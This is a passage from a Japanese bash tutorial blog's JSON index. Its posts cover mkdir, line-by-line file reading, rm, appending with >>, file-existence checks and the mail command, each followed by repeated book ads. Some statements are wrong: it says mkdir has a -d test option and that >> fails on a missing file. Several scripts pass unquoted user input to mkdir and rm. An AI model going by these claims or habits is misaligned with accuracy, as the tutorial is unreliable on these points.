第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-21-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-21-suzuki/","title":"【２１．ディレクトリを作成する】ざっくりわかる「シェルスクリプト」"},{"content":"存在を確認してディレクトリを作成する 存在を確認してディレクトリを作成します。\n\u0026lsquo;mkdir\u0026rsquo;コマンドを実行する前に、現在の場所にディレクトリが存在することを確認する事ができます。mkdir コマンドの\u0026rsquo; -d \u0026lsquo;オプションは、特定のディレクトリが存在するかどうかをテストするためのオプションです。\u0026lsquo;directory_exist.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加してください。ディレクトリの存在を確認してディレクトリを作成します。\n#!/bin/bash echo \u0026#34;ディレクトリ名を入力して下さい。\u0026#34;; read ndir; if [ -d \u0026#34;$ndir\u0026#34; ];then echo \u0026#34;ディレクトリが存在します。\u0026#34;; else `mkdir $ndir`; echo \u0026#34;ディレクトリを作成しました。\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash directory_exist.sh ディレクトリ名を入力して下さい。 suzuki ディレクトリを作成しました。 $ ls suzuki/ $ bash directory_exist.sh ディレクトリ名を入力して下さい。 suzuki ディレクトリが存在します。 $ ヒント 実はディレクトリの存在チェックを行わなくても先のスクリプトは問題なく動作します。 mkdir -p コマンドは以下のような挙動をします。 作成対象ディレクトリの親ディレクトリが存在しない場合 はすべての親ディレクトリを作成する\n作成対象ディレクトリがすでに存在している場合 は何も行わず、エラーもはかない #!/bin/bash # 一旦ディレクトリを作成 mkdir -p /tmp/work ls -l -d /tmp/work/ # 出力 # drwxr-xr-x 2 root root 64 Aug 22 08:26 /tmp/work/ # オプション無しですでに存在しているディレクトリを作成 mkdir /tmp/work # 出力 # mkdir: /tmp/work: File exists echo $? # 1 # -pオプション有りだとエラーを吐かない mkdir -p /tmp/work echo $? # 0 $ bash mkdir_example2.sh drwxr-xr-x 2 suzukiiichiro wheel 64 1 21 13:13 /tmp/work/ mkdir: /tmp/work: File exists 1 0 $ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-22-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-22-suzuki/","title":"【２２．存在を確認してディレクトリを作成する】ざっくりわかる「シェルスクリプト」"},{"content":"ファイルを読む ファイルを読む：\nwhileループでreadコマンドを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。\u0026lsquo;read_file.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加してください。 別途作成する\u0026rsquo;book.txt\u0026rsquo;の内容を読み取ります。\n「book.txt」ファイルを作成します。\n$ vim book.txt ファイルを読む： ループを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。 \u0026#39;read_file.sh\u0026#39;という名前のファイルを作成し、次のコードを追加して、\u0026#39;book.txt\u0026#39;という名前の既存のファイルを読み取ります。 #!/bin/bash file=\u0026#39;book.txt\u0026#39;; if [ -f \u0026#34;$file\u0026#34; ];then while read line;do echo \u0026#34;$line\u0026#34;; done\u0026lt;$file else echo \u0026#34;$file ファイルがありません\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash read_file.sh ファイルを読む： ループを使用すると、bashで任意のファイルを1行ずつ読み取ることができます。 \u0026#39;read_file.sh\u0026#39;という名前のファイルを作成し、次のコードを追加して、\u0026#39;book.txt\u0026#39;という名前の既存のファイルを読み取ります。 具体的に以下のファイルを作成してファイルを読み込み、必要な部分を抜き出して表示してみます。\ni-0f6126b7aeedfabd6,hoge i-050536efdd9dc1126,fuga i-0869f24358fb3f698,f8k cat します。\n$ cat instance-tag.list i-0f6126b7aeedfabd6,hoge i-050536efdd9dc1126,fuga i-0869f24358fb3f698,f8k $ 以下のソースファイルを作成します。\n#!/bin/bash # catしてwhile read で1行ずつ読み込む # 「cat instance-tag.list」の結果を1行ずつ「line」 # という変数に代入しています。 cat instance-tag.list | while read line;do # 二つの変数に値切り出して代入 # $()は()内で指定したコマンドの実行結果を返します。 # 今回の場合、「echo $line | cut -d, -f 1」の実行結果が # 「instance_id」に定義されます。 instance_id=$(echo $line | cut -d, -f 1) tag_value=$(echo $line | cut -d, -f 2) # 表示 echo \u0026#34;instance_id: ${instance_id}\u0026#34;; echo \u0026#34;tag_value: ${tag_value}\u0026#34;; done bashコマンドでファイルを実行します。\n$ bash whileread_example2.sh instance_id: i-0f6126b7aeedfabd6 tag_value: hoge instance_id: i-050536efdd9dc1126 tag_value: fuga instance_id: i-0869f24358fb3f698 tag_value: f8k $ ヒント cutコマンドの部分は、awkコマンドを使うこともあります。 今回は、cutの方が処理速度が速いため、cutコマンドを使いました。 ちなみにawkの場合は、以下のように記述します。\ninstance_id=$(echo $line | awk -F, \u0026#39;{print $1;}\u0026#39;); tag_value=$(echo $line | awk -F, \u0026#39;{print $2;}\u0026#39;); 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-23-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-23-suzuki/","title":"【２３．ファイルを読む】ざっくりわかる「シェルスクリプト」"},{"content":"ファイルを削除する ファイルを削除します：\n\u0026lsquo;rm\u0026rsquo;コマンドは、ファイルまたはディレクトリを削除するためのコマンドです。次のコードを使用して「delete_file.sh」という名前のファイルを作成し、ユーザーからファイル名を取得して削除します。ここで、「-i」オプションは、ファイルを削除する前にユーザーに削除確認をに使用されます。\n#!/bin/bash echo \u0026#34;削除するファイルまたはディレクトリ名を入力して下さい。\u0026#34; read fn rm -i $fn bashコマンドでファイルを実行します。\n$ ls suzuki/ book.txt bash delete_file.sh 削除するファイルまたはディレクトリ名を入力して下さい。 suzuki rm: suzuki: is a directory bash delete_file.sh 削除するファイルまたはディレクトリ名を入力して下さい。 book.txt $ ls suzuki/ $ ヒント 基本的に、ファイルもディレクトリも削除するコマンドは同じです。ディレクトリには再帰的に（フォルダの階層も含めて）削除するオプション(-r リカーション)があります。 rm\n-f :確認をせずに削除 -r ：再帰的に削除 フォルダを削除\nrm -rf 高度なヒント シェルスクリプトで自動化処理を作成する場合、cp や rm で、確認をせずに実行したいことが多々あります。 この場合は、 /bin/cp\nまたは\n/bin/rm を使うと、確認なしで実行することができます。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-24-suzuki/","title":"【２４．ファイルを削除する】ざっくりわかる「シェルスクリプト」"},{"content":"ファイルに追加 ファイルに追加：\nbashで「\u0026raquo;」演算子を使用すると、既存のファイルに新しいデータを追加できます。\u0026lsquo;append_file.sh \u0026lsquo;という名前のファイルを作成し、次のコードを追加して、ファイルの最後に新しいコンテンツを追加します。ここで、「Learning Level 5」は、スクリプトの実行後に「book.txt」ファイルのに追加されます。\n1. Pro AngularJS 2. Learning JQuery 3. PHP Programming 4. Code Igniter #!/bin/bash echo \u0026#34;追加する前のファイル\u0026#34;; cat book.txt; echo \u0026#34;5. Bash Programming\u0026#34; \u0026gt;\u0026gt; book.txt echo \u0026#34;追加した後のファイル\u0026#34; cat book.txt; bashコマンドでファイルを実行します。\n$ bash append_file.sh 追加する前のファイル 1. Pro AngularJS 2. Learning JQuery 3. PHP Programming 4. Code Igniter 追加した後のファイル 1. Pro AngularJS 2. Learning JQuery 3. PHP Programming 4. Code Igniter 5. Bash Programming $ ヒント 「\u0026gt;」はファイルを新しく作成して追記します。 「\u0026raquo;」は既に存在するファイルに追記します。ですので、ファイルが存在しないにもかかわらず、「\u0026raquo;」を行うと、ついするファイルがないため、エラーとなります。 ファイルの存在を確認するための方法を次の章で説明します。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-25-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-25-suzuki/","title":"【２５．ファイルに追加】ざっくりわかる「シェルスクリプト」"},{"content":"ファイルが存在するかどうかを確認 ファイルが存在するかどうかをテストします。\n\u0026lsquo;-e\u0026rsquo;または\u0026rsquo;-f\u0026rsquo;オプションを使用して、ファイルの存在を確認できます。次のコードの \u0026lsquo;if [ ]\u0026lsquo;では、ファイルの存在をテストするために「-f」オプションが使用されています。\u0026rsquo; file_exist.sh \u0026lsquo;という名前のファイルを作成し、次のコードを追加します。ここで、ファイル名はコマンドラインから渡されます。\n#!/bin/bash filename=$1; if [ -f \u0026#34;$filename\u0026#34; ];then echo \u0026#34;ファイルが存在します。\u0026#34;; else echo \u0026#34;ファイルは存在しません。\u0026#34;; fi bashコマンドでファイルを実行します。\n$ ls book.txt level.txt bash file_exist.sh level2.txt ファイルは存在しません。 bash file_exist.sh level.txt ファイルが存在します。 ヒント 「\u0026raquo;」（アペンド）を行う場合の注意点は、必ずアペンドするファイルが存在している必要があるところです。 ファイルが存在していればアペンド（追記）する。 ファイルが存在しなければファイルを作成して追記する。 といった処理が必要で、この処理を行わない場合、ファイルが存在しないにもかかわらず、値をファイルに追記しようとした際にエラーとなります。サンプルを以下に示します。 #!/bin/bash if [ -f level.txt ]; then # ファイルが存在するならば追記する echo \u0026#34;Bash Programming\u0026#34; \u0026gt;\u0026gt; level.txt; else # ファイルが存在しないからlevel.txtを作成してから追記 :\u0026gt; level.txt; echo \u0026#34;Bash Programming\u0026#34; \u0026gt;\u0026gt; level.txt; fi echo \u0026#34;追加した後のファイル\u0026#34; cat level.txt; ヒント touch コマンドと :\u0026gt; の違いを明確にしておく必要があります。 「:\u0026gt;」 は、該当ファイルがなければ作成、あっても空のファイルに置き換えます。 「touch」は、該当ファイルがなければ作成しますが、あれば何もしません。 この違いを利用するとif文はとても簡潔に書き換えることができます。 touchコマンドを使って上記ソースを書き換えてみます。 #!/bin/bash :\u0026gt; level.txt # 新規にファイルを作成 echo \u0026#34;Shell Scripting\u0026#34; \u0026gt;\u0026gt; level.txt; echo \u0026#34;1回目に追加したファイル\u0026#34; cat level.txt; # 既にファイルが存在するので何もしない # 万が一、ファイルが存在しなければ作成。 touch level.txt; echo \u0026#34;Bash Programming\u0026#34; \u0026gt;\u0026gt; level.txt; echo \u0026#34;2回目に追加したファイル\u0026#34; cat level.txt; $ bash bash_append_file3.sh 1回目に追加したファイル Shell Scripting 2回目に追加したファイル Shell Scripting Bash Programming $ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-26-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-26-suzuki/","title":"【２６．ファイルが存在するかどうかを確認】ざっくりわかる「シェルスクリプト」"},{"content":"mailコマンド メールを送る：\n\u0026rsquo; mail \u0026lsquo;または \u0026rsquo; sendmail \u0026lsquo;コマンドを使用して電子メールを送信できます。これらのコマンドを使用する前に、mailまたはsendmailに必要なパッケージをインストール・設定をする必要があります。\u0026rsquo; mail_example.sh \u0026lsquo;という名前のファイルを作成し、次のコードを追加して電子メールを送信します。\nmailコマンドインストール まずはここを参考に\nMacでコマンドからメールを送る Gmail\nlinuxの場合は\n$ yum install mailx 実際にメールを送ってみます。 $ echo \u0026#34;本文\u0026#34; | mail -s \u0026#34;タイトル\u0026#34; -r from@example.com -c cc1@example.com -c cc2@example.com to1@example.com to2@example.com 恐ろしいほどに簡単ですね。\nおかしな事をかんがえるのはやめましょう。\nシェルスクリプトでサンプルを作る admin@sample.com の部分を自分のメールアドレスに置き換えて実行して下さい。\n#!/bin/bash Recipient=\u0026#34;admin@sample.com\u0026#34; Subject=\u0026#34;Greeting” Message=\u0026#34;Welcome to our site\u0026#34; `mail -s $Subject $Recipient \u0026lt;\u0026lt;\u0026lt; $Message` bashコマンドでファイルを実行します。\n$ bash mail_example.sh $ ヒント くれぐれもおかしな事をかんがえるのはやめましょう。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 